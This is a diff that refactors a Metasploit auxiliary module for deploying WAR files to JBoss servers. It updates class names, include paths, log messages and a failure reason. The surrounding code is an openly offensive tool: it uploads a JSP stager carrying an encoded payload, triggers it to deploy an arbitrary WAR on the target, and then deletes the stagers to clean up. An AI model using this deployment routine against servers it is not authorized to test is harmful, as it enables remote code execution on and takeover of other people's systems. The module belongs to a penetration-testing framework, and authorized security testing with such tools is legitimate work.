@@ -1,13 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
-  include Msf::HTTP::JBoss
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HTTP::JBoss
 
   def initialize
     super(
@@ -41,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('APPBASE', [ true,  'Application base name', 'payload']),
         OptPath.new('WARFILE',   [ false, 'The WAR file to deploy'])
-      ], self.class)
+      ])
   end
 
   def deploy_action(app_base, war_data)
@@ -51,10 +48,10 @@ class Metasploit3 < Msf::Auxiliary
     stager_contents = stager_jsp_with_payload(app_base, encoded_payload)
 
     if http_verb == 'POST'
-      print_status("#{peer} - Deploying stager for the WAR file...")
+      print_status("Deploying stager for the WAR file...")
       res = upload_file(stager_base, stager_jsp_name, stager_contents)
     else
-      print_status("#{peer} - Deploying minimal stager to upload the payload...")
+      print_status("Deploying minimal stager to upload the payload...")
       head_stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
       head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)
       head_stager_uri = "/" + stager_base + "/" + head_stager_jsp_name + ".jsp"
@@ -79,20 +76,20 @@ class Metasploit3 < Msf::Auxiliary
       fail_with(Failure::Unknown, "Failed to deploy")
     end
 
-    print_status("#{peer} - Calling stager to deploy the payload warfile (might take some time)")
+    print_status("Calling stager to deploy the payload warfile (might take some time)")
     stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
     stager_res = deploy('uri' => stager_uri,
                         'method' => 'GET')
 
     if res && res.code == 200
-      print_good("#{peer} - Payload deployed")
+      print_good("Payload deployed")
     else
-      print_error("#{peer} - Failed to deploy final payload")
+      print_error("Failed to deploy final payload")
     end
 
     # Cleaning stagers
-    print_status("#{peer} - Undeploying stagers via DeploymentFileRepository.remove()...")
-    print_status("#{peer} - This might take some time, be patient...") if http_verb == "HEAD"
+    print_status("Undeploying stagers via DeploymentFileRepository.remove()...")
+    print_status("This might take some time, be patient...") if http_verb == "HEAD"
     delete_res = []
     if head_stager_jsp_name
       delete_res << delete_file(stager_base + '.war', head_stager_jsp_name, '.jsp')
@@ -101,28 +98,28 @@ class Metasploit3 < Msf::Auxiliary
     delete_res << delete_file('./', stager_base + '.war', '')
     delete_res.each do |res|
       if !res
-        print_warning("#{peer} - Unable to remove WAR [No Response]")
+        print_warning("Unable to remove WAR [No Response]")
       elsif (res.code < 200 || res.code >= 300)
-        print_warning("#{peer} - WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
+        print_warning("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
       end
     end
   end
 
   # Undeploy the WAR and the stager if needed
   def undeploy_action(app_base)
-    print_status("#{peer} - Undeploying #{app_base} via DeploymentFileRepository.remove()...")
+    print_status("Undeploying #{app_base} via DeploymentFileRepository.remove()...")
     print_status("This might take some time, be patient...") if http_verb == "HEAD"
     res = delete_file('./', app_base + '.war', '')
 
     unless res
-      print_error("#{peer} - Unable to remove WAR (no response)")
+      print_error("Unable to remove WAR (no response)")
       return
     end
 
     if res.code < 200 || res.code >= 300
-      print_error("#{peer} - Unable to remove WAR [#{res.code} #{res.message}]")
+      print_error("Unable to remove WAR [#{res.code} #{res.message}]")
     else
-      print_good("#{peer} - Successfully removed")
+      print_good("Successfully removed")
     end
   end
 
@@ -132,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
     case action.name
     when 'Deploy'
       unless datastore['WARFILE'] && File.exist?(datastore['WARFILE'])
-        fail_with("Unable to open WARFILE")
+        fail_with(Failure::BadConfig, "Unable to open WARFILE")
       end
       war_data = File.read(datastore['WARFILE'])
       deploy_action(app_base, war_data)
